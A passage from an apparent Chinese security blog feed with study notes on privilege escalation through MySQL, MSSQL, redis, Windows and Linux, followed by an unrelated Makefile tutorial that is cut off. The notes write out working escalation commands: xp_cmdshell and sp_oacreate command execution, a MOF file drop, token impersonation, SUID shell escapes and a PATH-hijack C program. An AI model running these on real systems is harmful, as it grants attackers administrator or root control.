FUNCTION 函数名 RETURNS STRING SONAME &#39;导出的dll&#39;;</code><br> 3.使用自定义的函数。<br> <code>select sys_eval(&#39;系统命令&#39;);</code><br> 删除函数<br> <code>drop function sys_eval;</code></li></ol><h5 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h5><ul><li>MOF 知识点：<ul><li>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。（基于 MYSQL 特性的安全问题）</li></ul></li><li>导出自定义 mof 文件到系统目录加载</li><li><code>select load_file(&#39;C:/phpStudy/PHPTutorial/WWW/user_add.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</code></li></ul><h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p><pre><code class="hljs">- 启动项知识点：（基于配合操作系统自启动）- 导出自定义可执行文件到启动目录配合重启执行- 将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</code></pre><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><h5 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h5><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。如果用户拥有管理员 sa 权限则可以用 sp_configure 重修开启它。</p><p>启用：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>关闭：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1;<br>reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 0;<br>reconfigure;<br></code></pre></td></tr></table></figure><p><code>EXEC master.dbo.xp_cmdshell &#39;命令&#39;</code><br>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复<br><code>exec master.sys.sp_addextendedproc &#39;xp_cmdshell&#39;, &#39;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll‘</code></p><h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。<br>启用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;, 1;<br>RECONFIGURE WITH OVERRIDE;<br>EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;<br>RECONFIGURE WITH OVERRIDE;<br><br></code></pre></td></tr></table></figure><p>关闭：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;, 1;<br>RECONFIGURE WITH OVERRIDE;<br>EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;<br>RECONFIGURE WITH OVERRIDE;<br></code></pre></td></tr></table></figure><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod<br>@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;<br></code></pre></td></tr></table></figure><h4 id="sp-oamethod"><a href="#sp-oamethod" class="headerlink" title="sp_oamethod"></a>sp_oamethod</h4><h5 id="沙盒模式"><a href="#沙盒模式" class="headerlink" title="沙盒模式"></a>沙盒模式</h5><h5 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h5><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><ul><li>利用计划任务执行命令反弹shell</li><li>写ssh-keygen公钥使用私钥登陆</li><li>低权限写webshell</li></ul><h4 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h4><ul><li>cve-2018-1058</li><li>cve-2019-9193</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-Windows</title>
      <link href="/2022/04/24/%E6%8F%90%E6%9D%83-Windows/"/>
      <url>/2022/04/24/%E6%8F%90%E6%9D%83-Windows/</url>
      
        <content type="html"><![CDATA[<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h3><ul><li>普通权限<ul><li>管理员组（administrator）高权限用户组（Power users）普通用户组（users）来宾用户组（Guests）</li></ul></li><li>特殊权限<ul><li>SYSTEM（系统）、Trustedinstaller（信任模块）、everyone（所有人）</li></ul></li></ul><h3 id="内核溢出漏洞提权："><a href="#内核溢出漏洞提权：" class="headerlink" title="内核溢出漏洞提权："></a>内核溢出漏洞提权：</h3><p>通过信息收集当前版本和补丁情况下存在什么漏洞寻找exp利用</p><h3 id="AT-SC-PS命令利用"><a href="#AT-SC-PS命令利用" class="headerlink" title="AT&amp;SC&amp;PS命令利用"></a>AT&amp;SC&amp;PS命令利用</h3><ul><li>AT ：<code>at 13:38 /interactive cmd.exe</code> 适用范围 Windows2000、Windows 2003、Windows XP</li><li>SC 适用范围： 适用于windows 7&#x2F;8、03&#x2F;08、12&#x2F;16</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">sc Create syscmd binPath= &quot;<span class="hljs-built_in">cmd</span> /K <span class="hljs-built_in">start</span>&quot; <span class="hljs-built_in">type</span>= own <span class="hljs-built_in">type</span>= interact<br>sc <span class="hljs-built_in">start</span> syscmd<br></code></pre></td></tr></table></figure><ul><li>PS提权：需要下载pstools <code>psexec.exe -accepteula -s -i -d cmd.exe</code> 适用范围：Win2003 &amp; Win2008</li></ul><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">use incognito<br>list_tokens -u<br>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<br></code></pre></td></tr></table></figure><h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>UAC(User Account Control，用户账号控制)是微软为了提高系统安全性在Windows Vista中引入的技术。</p><p>UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p><p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。</p><p>在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。</p><h4 id="UAC设置的四种方法"><a href="#UAC设置的四种方法" class="headerlink" title="UAC设置的四种方法"></a>UAC设置的四种方法</h4><ul><li>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</li><li>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</li></ul><h3 id="烂土豆提权：RottenPotato"><a href="#烂土豆提权：RottenPotato" class="headerlink" title="烂土豆提权：RottenPotato"></a>烂土豆提权：RottenPotato</h3><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Windows </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-Linux</title>
      <link href="/2022/04/24/%E6%8F%90%E6%9D%83-Linux/"/>
      <url>/2022/04/24/%E6%8F%90%E6%9D%83-Linux/</url>
      
        <content type="html"><![CDATA[<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><ul><li>利用工具：linux-expolit-suggester</li><li>脏牛提权：CVE-2016-5195</li><li>影响范围<ul><li>Centos7&#x2F;RHEL7     3.10.0-327.36.3.el7</li><li>Cetnos6&#x2F;RHEL6     2.6.32-642.6.2.el6</li><li>Ubuntu 16.10      4.8.0-26.28</li><li>Ubuntu 16.04      4.4.0-45.66</li><li>Ubuntu 14.04      3.13.0-100.147</li><li>Debian 8          3.16.36-1+deb8u2</li><li>Debian 7          3.2.82-1</li></ul></li><li>CVE-2022-0874</li><li>受影响的版本：<br><code>5.8&lt;=Linux kernel&lt;5.16.11/5.15.25/5.10.102</code></li></ul><h3 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h3><ul><li>pkexec<br>影响版本<br>2009年5月至2021年发布的所有 Polkit 版本大概是deb系1.0.105 0,115以下 centos部分是0.96 0.112以下</li></ul><h3 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h3><p>查找当前suid权限命令<br><code>find / -perm -u=s -type f 2&gt;/dev/null  </code><br>可用于suid提权的命令</p><ul><li>Nmap</li><li>Vim<ul><li><code>sudo vim -c &#39;!sh&#39;</code></li></ul></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">:<span class="hljs-built_in">set</span> <span class="hljs-attribute">shell</span>=/bin/sh<br>:shell<br></code></pre></td></tr></table></figure><ul><li>find<ul><li><code>find tiquan -exec whoami \; </code></li></ul></li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><ul><li>&#x2F;etc&#x2F;sudoers文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证</li><li>我们可以使用teehee命令将一个无密码用户admin写入到&#x2F;etc&#x2F;passwd文件，并加入到root组中</li></ul><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><ul><li>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。</li><li>一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是 &#x2F;etc&#x2F; 内系统的计划任务可以被列出。默认这些程序以root权限执行，如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</li><li>思路<ol><li>Cronjob中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol></li><li>一些命令<ul><li><code>crontab -l </code>显示当前用户的cron</li><li><code>ls -la /etc/cron* </code>显示计划的作业概述</li></ul></li></ul><h3 id="本地环境变量安全问题提权"><a href="#本地环境变量安全问题提权" class="headerlink" title="本地环境变量安全问题提权"></a>本地环境变量安全问题提权</h3><ul><li>利用前提：<br>demo.c</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setuid(<span class="hljs-number">0</span>);<br>    setgid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;ps&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>方法：配合 SUID 进行环境变量提权-本地用户环境 手写调用文件-编译-复制文件-增加环境变量-执行触发</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc demo.c -o shell<br><span class="hljs-built_in">cp</span> /bin/sh /tmp/ps<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>./shell<br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile-简易教程</title>
      <link href="/2022/04/24/Makefile-%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/24/Makefile-%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>Make是最常用的构建工具，诞生于1977年，主要用于C语言的项目。但是实际上 ，任何只要某个文件有变化，就要重新构建的项目，都可以用Make构建。</p><span id="more"></span><h2 id="一、Make的概念"><a href="#一、Make的概念" class="headerlink" title="一、Make的概念"></a>一、Make的概念</h2><p>Make这个词，英语的意思是”制作”。Make命令直接用了这个意思，就是要做出某个文件。比如，要做出文件a.txt，就可以执行下面的命令。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>make a.txt<br></code></pre></td></tr></table></figure><p>但是，如果你真的输入这条命令，它并不会起作用。因为Make命令本身并不知道，如何做出a.txt，需要有人告诉它，如何调用其他命令完成这个目标。</p><p>比如，假设文件 a.txt 依赖于 b.txt 和 c.txt ，是后面两个文件连接（cat命令）的产物。那么，make 需要知道下面的规则。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">a.txt: b.txt c.txt</span><br>    cat b.txt c.txt &gt; a.txt<br></code></pre></td></tr></table></figure><p>也就是说，make a.txt 这条命令的背后，实际上分成两步：第一步，确认 b.txt 和 c.txt 必须已经存在，第二步使用 cat 命令 将这个两个文件合并，输出为新文件。</p><p>像这样的规则，都写在一个叫做Makefile的文件中，Make命令依赖这个文件进行构建。Makefile文件也可以写为makefile， 或者用命令行参数指定为其他文件名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make -f rules.txt<br><span class="hljs-comment"># 或者</span><br>$ make --file=rules.txt<br></code></pre></td></tr></table></figure><p>上面代码指定make命令依据rules.txt文件中的规则，进行构建。</p><p>总之，make只是一个根据指定的Shell命令进行构建的工具。它的规则很简单，你规定要构建哪个文件、它依赖哪些源文件，当那些文件有变动时，如何重新构建它。</p><h2 id="二、Makefile文件的格式"><a href="#二、Makefile文件的格式" class="headerlink" title="二、Makefile文件的格式"></a>二、Makefile文件的格式</h2><p>构建规则都写在Makefile文件里面，要学会如何Make命令，就必须学会如何编写Makefile文件。</p><h3 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h3><p>Makefile文件由一系列规则（rules）构成。每条规则的形式如下。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">&lt;target&gt; : &lt;prerequisites&gt; <br>[tab]  &lt;commands&gt;<br></code></pre></td></tr></table></figure><p>上面第一行冒号前面的部分，叫做”目标”（target），冒号后面的部分叫做”前置条件”（prerequisites）；第二行必须由一个tab键起首，后面跟着”命令”（commands）。</p><p>“目标”是必需的，不可省略；”前置条件”和”命令”都是可选的，但是两者之中必须至少存在一个。</p><p>每条规则就明确两件事：构建目标的前置条件是什么，以及如何构建。下面就详细讲解，每条规则的这三个组成部分。</p><h3 id="2-2-目标（target）"><a href="#2-2-目标（target）" class="headerlink" title="2.2 目标（target）"></a>2.2 目标（target）</h3><p>一个目标（target）就构成一条规则。目标通常是文件名，指明Make命令所要构建的对象，比如上文的 a.txt 。目标可以是一个文件名，也可以是多个文件名，之间用空格分隔。</p><p>除了文件名，目标还可以是某个操作的名字，这称为”伪目标”（phony target）。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">clean:</span><br>      rm *.o<br></code></pre></td></tr></table></figure><p>上面代码的目标是clean，它不是文件名，而是一个操作的名字，属于”伪目标 “，作用是删除对象文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make  clean<br></code></pre></td></tr></table></figure><p>但是，如果当前目录中，正好有一个文件叫做clean，那么这个命令不会执行。因为Make发现clean文件已经存在，就认为没有必要重新构建了，就不会执行指定的rm命令。</p><p>为了避免这种情况，可以明确声明clean是”伪目标”，写法如下。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean:</span><br>        rm *.o temp<br></code></pre></td></tr></table></figure><p>声明clean是”伪目标”之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令。像.PHONY这样的内置目标名还有不少，可以查看<a href="https://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets">手册</a>。</p><p>如果Make命令运行时没有指定目标，默认会执行Makefile文件的第一个目标。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make<br></code></pre></td></tr></table></figure><p>上面代码执行Makefile文件的第一个目标。</p><h3 id="2-3-前置条件（prerequisites）"><a href="#2-3-前置条件（prerequisites）" class="headerlink" title="2.3 前置条件（prerequisites）"></a>2.3 前置条件（prerequisites）</h3><p>前置条件通常是一组文件名，之间用空格分隔。它指定了”目标”是否重新构建的判断标准：只要有一个前置文件不存在，或者有过更新（前置文件的last-modification时间戳比目标的时间戳新），”目标”就需要重新构建。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">result.txt: source.txt</span><br>    cp source.txt result.txt<br></code></pre></td></tr></table></figure><p>上面代码中，构建 result.txt 的前置条件是 source.txt 。如果当前目录中，source.txt 已经存在，那么<code>make result.txt</code>可以正常运行，否则必须再写一条规则，来生成 source.txt 。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">source.txt:</span><br>    echo <span class="hljs-string">&quot;this is the source&quot;</span> &gt; source.txt<br></code></pre></td></tr></table></figure><p>上面代码中，source.txt后面没有前置条件，就意味着它跟其他文件都无关，只要这个文件还不存在，每次调用<code>make source.txt</code>，它都会生成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make result.txt<br>$ make result.txt<br></code></pre></td></tr></table></figure><p>上面命令连续执行两次<code>make result.txt</code>。第一次执行会先新建 source.txt，然后再新建 result.txt。第二次执行，Make发现 source.txt 没有变动（时间戳晚于 result.txt），就不会执行任何操作，result.txt 也不会重新生成。</p><p>如果需要生成多个文件，往往采用下面的写法。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">source: file1 file2 file3</span><br></code></pre></td></tr></table></figure><p>上面代码中，source 是一个伪目标，只有三个前置文件，没有任何对应的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make <span class="hljs-built_in">source</span><br></code></pre></td></tr></table></figure><p>执行<code>make source</code>命令后，就会一次性生成 file1，file2，file3 三个文件。这比下面的写法要方便很多。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make file1<br>$ make file2<br>$ make file3<br></code></pre></td></tr></table></figure><h3 id="2-4-命令（commands）"><a href="#2-4-命令（commands）" class="headerlink" title="2.4 命令（commands）"></a>2.4 命令（commands）</h3><p>命令（commands）表示如何更新目标文件，由一行或多行的Shell命令组成。它是构建”目标”的具体指令，它的运行结果通常就是生成目标文件。</p><p>每行命令之前必须有一个tab键。如果想用其他键，可以用内置变量.RECIPEPREFIX声明。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">.RECIPEPREFIX = &gt;<br><span class="hljs-section">all:</span><br>&gt; echo Hello, world<br></code></pre></td></tr></table></figure><p>上面代码用.RECIPEPREFIX指定，大于号（&gt;）替代tab键。所以，每一行命令的起首变成了大于号，而不是tab键。</p><p>需要注意的是，每行命令在一个单独的shell中执行。这些Shell之间没有继承关系。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">var-lost:</span><br>    <span class="hljs-keyword">export</span> foo=bar<br>    echo <span class="hljs-string">&quot;foo=[$$foo]&quot;</span><br></code></pre></td></tr></table></figure><p>上面代码执行后（<code>make var-lost</code>），取不到foo的值。因为两行命令在两个不同的进程执行。一个解决办法是将两行命令写在一行，中间用分号分隔。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">var-kept:</span><br>    <span class="hljs-keyword">export</span> foo=bar; echo <span class="hljs-string">&quot;foo=[$$foo]&quot;</span><br></code></pre></td></tr></table></figure><p>另一个解决办法是在换行符前加反斜杠转义。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">var-kept:</span><br>    <span class="hljs-keyword">export</span> foo=bar; \<br>    echo <span class="hljs-string">&quot;foo=[$$foo]&quot;</span><br></code></pre></td></tr></table></figure><p>最后一个方法是加上<code>.ONESHELL:</code>命令。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">.ONESHELL:</span><br><span class="hljs-section">var-kept:</span><br>    <span class="hljs-keyword">export</span> foo=bar; <br>    echo <span class="hljs-string">&quot;foo=[$$foo]&quot;</span><br></code></pre></td></tr></table></figure><h2 id="三、Makefile文件的语法"><a href="#三、Makefile文件的语法" class="headerlink" title="三、Makefile文件的语法"></a>三、Makefile文件的语法</h2><h3 id="3-1-注释"><a href="#3-1-注释" class="headerlink" title="3.1 注释"></a>3.1 注释</h3><p>井号（#）在Makefile中表示注释。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># 这是注释</span><br><span class="hljs-section">result.txt: source.txt</span><br>    <span class="hljs-comment"># 这是注释</span><br>    cp source.txt result.txt <span class="hljs-comment"># 这也是注释</span><br></code></pre></td></tr></table></figure><h3 id="3-2-回声（echoing）"><a href="#3-2-回声（echoing）" class="headerlink" title="3.2 回声（echoing）"></a>3.2 回声（echoing）</h3><p>正常情况下，make会打印每条命令，然后再执行，这就叫做回声（echoing）。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">test:</span><br>    <span class="hljs-comment"># 这是测试</span><br></code></pre></td></tr></table></figure><p>执行上面的规则，会得到下面的结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ make <span class="hljs-built_in">test</span><br><span class="hljs-comment"># 这是测试</span><br></code></pre></td></tr></table></figure><p>在命令的前面加上@，就可以关闭回声。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">test:</span><br>    @<span class="hljs-comment"># 这是测试</span><br></code></pre></td></tr></table></figure><p>现在再执行<code>make test</code>，就不会有任何输出。</p><p>由于在构建过程中，需要了解当前在执行哪条命令，所以通常只在注释和纯显示的echo命令前面加上@。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">test:</span><br>    @<span class="hljs-comment"># 这是测试</span><br>    @echo TODO<br></code></pre></td></tr></table></figure><h3 id="3-3-通配符"><a href="#3-3-通配符" class="headerlink" title="3.3 通配符"></a>3.3 通配符</h3><p>通配符（wildcard）用来指定一组符合条件的文件名。Makefile 的通配符与 Bash 一致，主要有星号（*）、问号（？）和 […] 。比如， *.o 表示所有后缀名为o的文件。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">clean:</span><br>        rm -f *.o<br></code></pre></td></tr></table></figure><h3 id="3-4-模式匹配"><a href="#3-4-模式匹配" class="headerlink" title="3.4 模式匹配"></a>3.4 模式匹配</h3><p>Make命令允许对文件名，进行类似正则运算的匹配，主要用到的匹配符是%。比如，假定当前目录下有 f1.c 和 f2.c 两个源码文件，需要将它们编译为对应的对象文件。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">%.o: %.c</span><br></code></pre></td></tr></table></figure><p>等同于下面的写法。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">f1.o: f1.c</span><br><span class="hljs-section">f2.o: f2.c</span><br></code></pre></td></tr></table></figure><p>使用匹配符%，可以将大量同类型的文件，只用一条规则就完成构建。</p><h3 id="3-5-变量和赋值符"><a href="#3-5-变量和赋值符" class="headerlink" title="3.5 变量和赋值符"></a>3.5 变量和赋值符</h3><p>Makefile 允许使用等号自定义变量。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">txt = Hello 